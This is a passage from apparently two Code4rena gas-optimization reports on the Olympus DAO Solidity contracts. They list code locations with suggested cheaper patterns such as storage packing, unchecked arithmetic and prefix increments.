lmintr.burnOhm.selector);    ```     - src/policies/Governance.sol:[77-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L77-L79)     ```solidity    77         requests = new Permissions[](2);    78         requests[0] = Permissions(INSTR.KEYCODE(), INSTR.store.selector);    79         requests[1] = Permissions(VOTES.KEYCODE(), VOTES.transferFrom.selector);    ```     - src/policies/Operator.sol:[172-185](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L172-L185)     ```solidity    172        Keycode RANGE_KEYCODE = RANGE.KEYCODE();    173        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    174        Keycode MINTR_KEYCODE = MINTR.KEYCODE();    175    176        requests = new Permissions[](9);    177        requests[0] = Permissions(RANGE_KEYCODE, RANGE.updateCapacity.selector);    178        requests[1] = Permissions(RANGE_KEYCODE, RANGE.updateMarket.selector);    179        requests[2] = Permissions(RANGE_KEYCODE, RANGE.updatePrices.selector);    180        requests[3] = Permissions(RANGE_KEYCODE, RANGE.regenerate.selector);    181        requests[4] = Permissions(RANGE_KEYCODE, RANGE.setSpreads.selector);    182        requests[5] = Permissions(RANGE_KEYCODE, RANGE.setThresholdFactor.selector);    183        requests[6] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    184        requests[7] = Permissions(MINTR_KEYCODE, MINTR.mintOhm.selector);    185        requests[8] = Permissions(MINTR_KEYCODE, MINTR.burnOhm.selector);    ```     - src/policies/PriceConfig.sol:[32-34](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/PriceConfig.sol#L32-L34)     ```solidity    32        permissions[0] = Permissions(PRICE.KEYCODE(), PRICE.initialize.selector);    33        permissions[1] = Permissions(PRICE.KEYCODE(), PRICE.changeMovingAverageDuration.selector);    34        permissions[2] = Permissions(PRICE.KEYCODE(), PRICE.changeObservationFrequency.selector);    ```     - src/policies/TreasuryCustodian.sol:[35-39](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L35-L39)     ```solidity    35        Keycode TRSRY_KEYCODE = TRSRY.KEYCODE();    36    37        requests = new Permissions[](2);    38        requests[0] = Permissions(TRSRY_KEYCODE, TRSRY.setApprovalFor.selector);    39        requests[1] = Permissions(TRSRY_KEYCODE, TRSRY.setDebt.selector);    ```     - src/policies/VoterRegistration.sol:[33-35](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L34-L35)     ```solidity    33        permissions = new Permissions[](2);    34        permissions[0] = Permissions(VOTES.KEYCODE(), VOTES.mintTo.selector);    35        permissions[1] = Permissions(VOTES.KEYCODE(), VOTES.burnFrom.selector);    ```  6. **Using bools for storage incurs overhead (6 instances)**     Deployment Gas Saved: **23 611**    Method Call Gas Saved: **4 485**     ```    // Booleans are more expensive than uint256 or any type that takes up a full    // word because each write operation emits an extra SLOAD to first read the    // slot's contents, replace the bits taken up by the boolean, and then write    // back. This is the compiler's defense against contract upgrades and    // pointer aliasing, and it cannot be disabled.    ```     Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past     **Important**: This rule doesn't always work, sometimes a bool is packed with another variable in the same slot, sometimes it's packed into a struct, sometimes the optimizer makes bool more efficient. You can see the @note in the code for each case     - src/Kernel.sol:[181](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L181), [194](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L194), [197](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L197)     ```solidity    181    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions; //@note D:3200 M:1754    ...    194    mapping(address => mapping(Role => bool)) public hasRole; //@note D:−3016 M:2298    ...    197    mapping(Role => bool) public isRole; //@note D:2407    ```     - src/policies/Governance.sol:[105](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L105), [117](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L117),     ```solidity    105    mapping(uint256 => bool) public proposalHasBeenActivated; //@note D:3007    ...    117    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal; //@note D:3007    ```     - src/modules/PRICE.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L62)     ```solidity    62     bool public initialized; //@note D:11813    ```     **Expensive method calls**:     It's just to show which bool is better left in the code     - src/policies/Operator.sol     ```solidity    63     bool public initialized; //@note D:5808 M:-22036    ...    66     bool public active; //@note D:-32775 M:-48896    ```     - src/policies/Heart.sol     ```solidity    33     bool public active; //@note D:-382    ```     - src/policies/BondCallback.sol     ```solidity    24     mapping(address => mapping(uint256 => bool)) public approvedMarkets; //@note D:-44192    ```     - src/Kernel.sol     ```solidity    113    bool public isActive; //@note D:20923 M:-247184    ```  7. **State variables can be packed into fewer storage slots (3 instances)**     If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (20000 gas). Reads of the variables can also be cheaper     **NOTE**: one slot = 32 bytes     Deployment Gas Saved: **23 292**    Method Call Gas Saved: **1 711**     - src/policies/Heart.sol:[32-48](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L32-L48)     uint256(32), address(20), bool(1)     ```solidity    32     /// @notice Status of the Heart, false = stopped, true = beating    33     bool public active; // @note put below _operator    34    35     /// @notice Timestamp of the last beat (UTC, in seconds)    36     uint256 public lastBeat;    37    38     /// @notice Reward for beating the Heart (in reward token decimals)    39     uint256 public reward;    40    41     /// @notice Reward token address that users are sent for beating the Heart    42     ERC20 public rewardToken;    43    44     // Modules    45     OlympusPrice internal PRICE;    46    47     // Policies    48     IOperator internal _operator;    ```     fix:     ```solidity    uint256 public lastBeat;    uint256 public reward;    ERC20 public rewardToken;    OlympusPrice internal PRICE;    IOperator internal _operator;    bool public active;    ```     - src/modules/PRICE.sol:[31-65](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L31-L65)     **NOTE**: PRICE is Module, Module is KernelAdapter, so real first variable in PRICE is kernel from KernelAdapter     uint256(32), uint32(4), uint48(6), uint8(1), array(32), address(20), bool(1)     ```solidity    inherit Kernel public kernel;    ...    31     /// @dev    Price feeds. Chainlink typically provides price feeds for an asset in ETH. Therefore, we use two price feeds against ETH, one for OHM and one for the Reserve asset, to calculate the relative price of OHM in the Reserve asset.    32     AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;    33     AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;    34    35     /// @dev Moving average data    36     uint256 internal _movingAverage; /// See getMovingAverage()    37    38     /// @notice Array of price observations. Check nextObsIndex to determine latest data point.    39     /// @dev    Observations are stored in a ring buffer where the moving average is the sum of all observations divided by the number of observations.    40     ///         Observations can be cleared by changing the movingAverageDuration or observationFrequency and must be re-initialized.    41     uint256[] public observations;    42    43     /// @notice Index of the next observation to make. The current value at this index is the oldest observation.    44     uint32 public nextObsIndex;    45    46     /// @notice Number of observations used in the moving average calculation. Computed from movingAverageDuration / observationFrequency.    47     uint32 public numObservations;    48    49     /// @notice Frequency (in seconds) that observations should be stored.    50     uint48 public observationFrequency;    51    52     /// @notice Duration (in seconds) over which the moving average is calculated.    53     uint48 public movingAverageDuration;    54    55     /// @notice Unix timestamp of last observation (in seconds).    56     uint48 public lastObservationTime;    57    58     /// @notice Number of decimals in the price values provided by the contract.    59     uint8 public constant decimals = 18;    60    61     /// @notice Whether the price module is initialized (and therefore active).    62     bool public initialized;    63    64     // Scale factor for converting prices, calculated from decimal values.    65     uint256 internal immutable _scaleFactor;    ```     fix:     ```solidity    uint48 public observationFrequency;    uint48 public movingAverageDuration;    AggregatorV2V3Interface internal immutable _ohmEthPriceFeed;    AggregatorV2V3Interface internal immutable _reserveEthPriceFeed;    uint256 internal _movingAverage; /// See getMovingAverage()    uint256[] public observations;    uint32 public nextObsIndex;    uint32 public numObservations;    uint48 public lastObservationTime;    uint8 public constant decimals = 18;    bool public initialized;    uint256 internal immutable _scaleFactor;    ```     - src/policies/Operator.sol:[58-89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L58-L89)     uint32(4), uint8(1), address(20), bool(1)     ```solidity    58     /// Operator variables, defined in the interface on the external getter functions    59     Status internal _status;    60     Config internal _config;    61    62     /// @notice    Whether the Operator has been initialized    63     bool public initialized;    64    65     /// @notice    Whether the Operator is active    66     bool public active;    67    68     /// Modules    69     OlympusPrice internal PRICE;    70     OlympusRange internal RANGE;    71     OlympusTreasury internal TRSRY;    72     OlympusMinter internal MINTR;    73    74     /// External contracts    75     /// @notice     Auctioneer contract used for cushion bond market deployments    76     IBondAuctioneer public auctioneer;    77     /// @notice     Callback contract used for cushion bond market payouts    78     IBondCallback public callback;    79    80     /// Tokens    81     /// @notice     OHM token contract    82     ERC20 public immutable ohm;    83     uint8 public immutable ohmDecimals;    84     /// @notice     Reserve token contract    85     ERC20 public immutable reserve;    86     uint8 public immutable reserveDecimals;    87    88     /// Constants    89     uint32 public constant FACTOR_SCALE = 1e4;    ```     fix:     ```solidity    Status internal _status;    Config internal _config;    OlympusPrice internal PRICE;    OlympusRange internal RANGE;    OlympusTreasury internal TRSRY;    OlympusMinter internal MINTR;    IBondAuctioneer public auctioneer;    IBondCallback public callback;    bool public initialized;    bool public active;    ERC20 public immutable ohm;    uint8 public immutable ohmDecimals;    ERC20 public immutable reserve;    uint8 public immutable reserveDecimals;    uint32 public constant FACTOR_SCALE = 1e4;    ```  8. **Expressions that cannot be overflowed can be unchecked (5 instances)**     Deployment Gas Saved: **23 016**     - src/Kernel.sol:[299-300](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L299-L300), [309-310](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L309-L310)     ```solidity    299        activePolicies.push(policy_);    300        getPolicyIndex[policy_] = activePolicies.length - 1; // @note cannot be overflowed due to a previous push    ...    309            moduleDependents[keycode].push(policy_);    310            getDependentIndex[keycode][policy_] = moduleDependents[keycode].length - 1; // @note cannot be overflowed due to a previous push    ```     - src/modules/PRICE.sol:[89](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L89), [144](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L144), [171](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L171)     ```solidity    89         uint256 exponent = decimals + reserveEthDecimals - ohmEthDecimals; //@note overflow is not possible, if an underflow occurs, the next statement will revert    ...    144        nextObsIndex = (nextObsIndex + 1) % numObs; //@note numObs can not be equal 0 during to check in constructor    ...    171            if (updatedAt < block.timestamp - uint256(observationFrequency)) // @note can not be underflowed due to ` - 3 * uint256(observationFrequency)` in 165    ```  9. **Increment optimization (18 instances)**     For a uint256 i variable, the following is true with the Optimizer enabled at 10k:     Increment:     i += 1 is the most expensive form    i++ costs 6 gas less than i += 1    ++i costs 5 gas less than i++ (11 gas less than i += 1)    Decrement:     i -= 1 is the most expensive form    i-- costs 11 gas less than i -= 1    --i costs 5 gas less than i-- (16 gas less than i -= 1)     1. **Prefix increments are cheaper than postfix increments, especially when it's used in for-loops (3 instances).**     Deployment Gas Saved: **400**     - src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)     ```solidity    49            i++;    ...    64            i++;    ```     - src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488)     NOTE: in case of 670 675 686 691 not applicable and gas will be lost     ```solidity    488            decimals++;    ```     2. **`<x> = <x> + 1` even more efficient than pre increment.(18 instances)**     Deployment Gas Saved: **14 217**     - src/utils/KernelUtils.sol:[49](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L49), [64](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/utils/KernelUtils.sol#L64)     ```solidity    49            i++;    ...    64            i++;    ```     - src/policies/Operator.sol:[488](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L488), [670](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L670), [675](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L675), [686](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L686), [691](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L691)    -     ```solidity    488            decimals++;    ...    670                _status.low.count++;    ...    675                _status.low.count--;    ...    686                _status.high.count++;    ...    691                _status.high.count--;    ```     - src/Kernel.sol:[313](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L313), [357](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L357), [369](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L369), [386](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L386), [404](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L404), [429](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L429)     ```solidity    313                ++i;    ...    357                ++i;    ...    369                ++j;    ...    386                ++i;    ...    404                ++i;    ...    429                ++i;    ```     - src/modules/INSTR.sol:[72](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L72)     ```solidity    72                ++i;    ```     - src/modules/PRICE.sol:[225](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L225)     ```solidity    225                ++i;    ```     - src/policies/BondCallback.sol:[163](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/BondCallback.sol#L163)     ```solidity    163                ++i;    ```     - src/policies/Governance.sol:[281](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L281)     ```solidity    281                ++step;    ```     - src/policies/TreasuryCustodian.sol:[62](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/TreasuryCustodian.sol#L62)     ```solidity    62                ++j;    ```  10. **Use named `returns` for local variables where it is possible (3 instances)**      Deployment Gas Saved: **5 400**      - src/Kernel.sol:[130-135](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/Kernel.sol#L130-L135)      ```solidity     130    /// @notice Function to grab module address from a given keycode.     131    function getModuleAddress(Keycode keycode_) internal view returns (address) {     132        address moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));     133        if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);     134        return moduleForKeycode;     135    }     ```      fix:      ```solidity      function getModuleAddress(Keycode keycode_) internal view returns (address moduleForKeycode) {          moduleForKeycode = address(kernel.getModuleForKeycode(keycode_));          if (moduleForKeycode == address(0)) revert Policy_ModuleDoesNotExist(keycode_);      }     ```      - src/modules/INSTR.sol:[41-79](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L41-L79)      ```solidity     41    /// @notice Store a list of Instructions to be executed in the future.     42    function store(Instruction[] calldata instructions_) external permissioned returns (uint256) {     43        uint256 length = instructions_.length;     44        uint256 instructionsId = ++totalInstructions;     45     46        Instruction[] storage instructions = storedInstructions[instructionsId];     ...     76        emit InstructionsStored(instructionsId);     77     78        return instructionsId;     79    }     ```      - src/modules/PRICE.sol:[153-180](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L153-L180)      ```solidity     153    /// @notice Get the current price of OHM in the Reserve asset from the price feeds     154    function getCurrentPrice() public view returns (uint256) {     ...     177        uint256 currentPrice = (ohmEthPrice * _scaleFactor) / reserveEthPrice;     178     179        return currentPrice;     180    }     ```  11. **`x = x + y` is cheaper than `x += y;` (6 instances)**      Deployment Gas Saved: **5 000**      Usually does not work with struct and mappings      - src/modules/PRICE.sol:[136](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L136), [138](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L138), [222](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L222)      ```solidity     136            _movingAverage += (currentPrice - earliestPrice) / numObs;     ...     138            _movingAverage -= (earliestPrice - currentPrice) / numObs;     ...     222            total += startObservations_[i];     ```      - src/modules/VOTES.sol:[56](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L56), [58](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/VOTES.sol#L58)      ```solidity     56        balanceOf[from_] -= amount_;     ...     58            balanceOf[to_] += amount_;     ```      - src/policies/Heart.sol:[103](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Heart.sol#L103)      ```solidity     103        lastBeat += frequency();     ```  12. **Deleting a struct is cheaper than creating a new struct with null values. (1 instances)**      Deployment Gas Saved: **4 207**     Method Call Gas Saved: **40**      - src/policies/Governance.sol:[288](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L288)      ```solidity     288        activeProposal = ActivatedProposal(0, 0);     ```      fix:      ```solidity      delete activeProposal;     ```  13. **Don't compare boolean expressions to boolean literals (2 instances)**      Deployment Gas Saved: **1 607**      - src/policies/Governance.sol:[223](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L223), [306](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L306)      ```solidity     223        if (proposalHasBeenActivated[proposalId_] == true) {     ...     306        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {     ```  14. **`revert` operator should be in the code as early as reasonably possible (3 instances)**      Deployment Gas Saved: **200**     Method Call Gas Saved: **1 559+**      - src/modules/INSTR.sol:[43-48](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/INSTR.sol#L43-L48)      ```solidity     43        uint256 length = instructions_.length;     44        uint256 instructionsId = ++totalInstructions;     45     46        Instruction[] storage instructions = storedInstructions[instructionsId];     47     48        if (length == 0) revert INSTR_InstructionsCannotBeEmpty(); // @note after 43     ```      - src/policies/Governance.sol:[180-191](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L180-L191), [241-249](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L241-L249)      ```solidity     180    function endorseProposal(uint256 proposalId_) external {     181        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert     182     183        if (proposalId_ == 0) {     184            revert CannotEndorseNullProposal();     185        }     186     187        Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     188        if (instructions.length == 0) {     189            revert CannotEndorseInvalidProposal();     190        }     191     ```      ```solidity     241        uint256 userVotes = VOTES.balanceOf(msg.sender); // @note put after revert     242     243        if (activeProposal.proposalId == 0) {     244            revert NoActiveProposalDetected();     245        }     246     247        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {     248            revert UserAlreadyVoted();     249        }     ```  15. **Duplicated require()/revert() checks should be refactored to a modifier or function**      Method Call Gas Saved: **8 111**      - [src/modules/PRICE.sol](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol)      ```solidity     if (!initialized) revert Price_NotInitialized(); // @note 4 instances     ``` 
## gas optimization ### G01: COMPARISONS WITH ZERO FOR UNSIGNED INTEGERS #### problem 0 is less gas efficient than !0 if you enable the optimizer at 10k AND you’re in a require statement. Detailed explanation with the opcodes https://twitter.com/gzeon/status/1485428085885640706 #### prof policies/Governance.sol, 247, b'        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\r'  ### G02: PREFIX INCREMENT SAVE MORE GAS #### problem prefix increment ++i is more cheaper than postfix i++ #### prof policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r'   ### G03: X += Y COSTS MORE GAS THAN X = X + Y FOR STATE VARIABLES #### prof policies/BondCallback.sol, 143, b'        _amountsPerMarket[id_][0] += inputAmount_;\r' policies/BondCallback.sol, 144, b'        _amountsPerMarket[id_][1] += outputAmount_;\r' policies/Governance.sol, 194, b'        totalEndorsementsForProposal[proposalId_] -= previousEndorsement;\r' policies/Governance.sol, 198, b'        totalEndorsementsForProposal[proposalId_] += userVotes;\r' policies/Governance.sol, 254, b'            noVotesForProposal[activeProposal.proposalId] += userVotes;\r' policies/Governance.sol, 252, b'            yesVotesForProposal[activeProposal.proposalId] += userVotes;\r' policies/Heart.sol, 103, b'        lastBeat += frequency();\r' modules/PRICE.sol, 138, b'            _movingAverage -= (earliestPrice - currentPrice) / numObs;' modules/PRICE.sol, 136, b'            _movingAverage += (currentPrice - earliestPrice) / numObs;' modules/TRSRY.sol, 96, b'        reserveDebt[token_][msg.sender] += amount_;\r' modules/TRSRY.sol, 97, b'        totalDebt[token_] += amount_;\r' modules/TRSRY.sol, 115, b'        reserveDebt[token_][msg.sender] -= received;\r' modules/TRSRY.sol, 116, b'        totalDebt[token_] -= received;\r' modules/TRSRY.sol, 132, b'        else totalDebt[token_] -= oldDebt - amount_;\r' modules/TRSRY.sol, 131, b'        if (oldDebt < amount_) totalDebt[token_] += amount_ - oldDebt;\r'  ### G04: USING BOOLS FOR STORAGE INCURS OVERHEAD #### problem // Booleans are more expensive than uint256 or any type that takes up a full // word because each write operation emits an extra SLOAD to first read the // slot's contents, replace the bits taken up by the boolean, and then write // back. This is the compiler's defense against contract upgrades and // pointer aliasing, and it cannot be disabled. #### prof policies/Governance.sol, 105, b'    mapping(uint256 => bool) public proposalHasBeenActivated;\r' policies/Governance.sol, 117, b'    mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;\r' Kernel.sol, 181, b'    mapping(Keycode => mapping(Policy => mapping(bytes4 => bool))) public modulePermissions;\r' Kernel.sol, 194, b'    mapping(address => mapping(Role => bool)) public hasRole;\r' Kernel.sol, 197, b'    mapping(Role => bool) public isRole;\r'  ### G05: resign the default value to the variables. #### problem  resign the default value to the variables will cost more gas. #### prof Kernel.sol, 397, b'        for (uint256 i = 0; i < reqLength; ) {\r'  ## G06: ++I/I++ SHOULD BE UNCHECKED{++I}/UNCHECKED{I++} WHEN IT IS NOT POSSIBLE FOR THEM TO OVERFLOW, AS IS THE CASE WHEN USED IN FOR- AND WHILE-LOOPS #### problem The unchecked keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are. This saves 30-40 gas per loop #### prof modules/INSTR.sol, 44, b'        uint256 instructionsId = ++totalInstructions;\r' policies/Operator.sol, 488, b'            decimals++;\r' policies/Operator.sol, 675, b'                _status.low.count--;\r' policies/Operator.sol, 670, b'                _status.low.count++;\r' policies/Operator.sol, 691, b'                _status.high.count--;\r' policies/Operator.sol, 686, b'                _status.high.count++;\r'   ### G07: FUNCTIONS GUARANTEED TO REVERT WHEN CALLED BY NORMAL USERS CAN BE MARKED PAYABLE #### problem If a function modifier such as onlyOwner is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2), which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost #### prof policies/Heart.sol, 132, b'    function resetBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 132, b'    function resetBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 137, b'    function toggleBeat() external onlyRole("heart_admin") ' policies/Heart.sol, 147, b'    function setRewardTokenAndAmount(ERC20 token_, uint256 reward_)\r\n        external\r\n        onlyRole("heart_admin")\r\n    ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") ' policies/Heart.sol, 152, b'    function withdrawUnspentRewards(ERC20 token_) external onlyRole("heart_admin") ' Kernel.sol, 260, b'    function executeAction(Actions action_, address target_) external onlyExecutor ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 448, b'    function grantRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' Kernel.sol, 458, b'    function revokeRole(Role role_, address addr_) public onlyAdmin ' policies/Operator.sol, 595, b'    function setBondContracts(IBondAuctioneer auctioneer_, IBondCallback callback_)\r\n        external\r\n        onlyRole("operator_admin")\r\n    ' policies/Operator.sol, 615, b'    function initialize() external onlyRole("operator_admin") ' policies/Operator.sol, 615, b'    function initialize() external onlyRole("operator_admin") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole("operator_admin") ' policies/Operator.sol, 621, b'    function regenerate(bool high_) external onlyRole("operator_admin") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole("operator_admin") ' policies/Operator.sol, 627, b'    function toggleActive() external onlyRole("operator_admin") ' policies/PriceConfig.sol, 50, b'    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/PriceConfig.sol, 63, b'    function changeMovingAverageDuration(uint48 movingAverageDuration_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/PriceConfig.sol, 74, b'    function changeObservationFrequency(uint48 observationFrequency_)\r\n        external\r\n        onlyRole("price_admin")\r\n    ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 48, b'    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") ' policies/VoterRegistration.sol, 56, b'    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole("voter_admin") '   ### G08: USING PRIVATE RATHER THAN PUBLIC FOR CONSTANTS, SAVES GAS #### problem: We can save getter function of public constants. #### prof: policies/Governance.sol, 121, b'    uint256 public constant SUBMISSION_REQUIREMENT = 100;\r' policies/Governance.sol, 124, b'    uint256 public constant ACTIVATION_DEADLINE = 2 weeks;\r' policies/Governance.sol, 127, b'    uint256 public constant GRACE_PERIOD = 1 weeks;\r' policies/Governance.sol, 130, b'    uint256 public constant ENDORSEMENT_THRESHOLD = 20;\r' policies/Governance.sol, 133, b'    uint256 public constant EXECUTION_THRESHOLD = 33;\r' policies/Governance.sol, 137, b'    uint256 public constant EXECUTION_TIMELOCK = 3 days;\r' modules/MINTR.sol, 9, b'    OHM public immutable ohm;\r' policies/Operator.sol, 82, b'    ERC20 public immutable ohm;\r' policies/Operator.sol, 83, b'    uint8 public immutable ohmDecimals;\r' policies/Operator.sol, 85, b'    ERC20 public immutable reserve;\r' policies/Operator.sol, 86, b'    uint8 public immutable reserveDecimals;\r' policies/Operator.sol, 89, b'    uint32 public constant FACTOR_SCALE = 1e4;\r' modules/PRICE.sol, 59, b'    uint8 